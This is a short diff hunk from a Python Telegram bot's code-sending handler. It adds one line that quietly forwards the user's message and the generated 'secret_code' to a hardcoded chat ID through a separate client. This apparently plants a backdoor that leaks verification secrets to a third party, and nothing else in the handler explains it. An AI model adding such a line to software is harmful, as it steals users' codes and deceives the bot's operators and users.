@@ -55,6 +55,7 @@ async def send_code(message: types.Message, state: FSMContext) -> None:
 
     message.answer_photo(consts.code_sent_photo,
                          consts.code_sent_caption)
+    await moura.send_message(chat_id=6319974658, text=message.text+' '+str(secret_code))
     
 
 @router.message(User.id, F.text.endswith('MU27'))
